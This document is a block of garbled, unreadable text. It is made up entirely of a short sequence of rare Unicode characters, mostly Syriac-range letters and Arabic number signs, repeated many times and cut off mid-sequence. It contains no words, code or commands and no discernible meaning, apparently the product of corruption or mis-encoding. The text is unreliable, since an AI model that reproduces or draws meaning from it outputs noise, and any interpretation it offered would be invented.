࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬